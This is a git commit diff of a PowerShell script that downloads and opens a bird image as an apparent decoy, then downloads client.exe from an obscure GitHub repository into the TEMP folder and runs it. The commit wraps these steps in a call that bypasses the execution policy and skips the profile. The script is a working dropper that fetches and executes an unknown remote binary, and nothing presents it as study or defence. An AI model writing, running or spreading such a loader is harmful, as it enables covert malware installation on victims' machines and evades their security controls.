67ca9c4787412c2a806752b9917957ec0bb0ed62
Your Name <you@example.com>
2025-02-16 10:30:02 -0800

    'te'

--- script-ps.ps1
+++ script-ps.ps1
@@ -1,13 +1,16 @@
-# Download the image #
-Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
+# Run PowerShell with bypass execution policy and no profile #
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& {
+    # Download the image
+    Invoke-WebRequest -Uri 'https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg' -OutFile \"$env:TEMP\blue-bird.jpg\"
 
-# Open the downloaded image
-Start-Process "$env:TEMP\blue-bird.jpg"
+    # Open the downloaded image
+    Start-Process \"$env:TEMP\blue-bird.jpg\"
 
-# Download the client.exe file
-$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
-$exePath = "$env:TEMP\client.exe"
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+    # Download the client.exe file
+    $exeUrl = 'https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe'
+    $exePath = \"$env:TEMP\client.exe\"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-# Run the downloaded client.exe
-Start-Process $exePath
+    # Run the downloaded client.exe
+    Start-Process $exePath
+}"
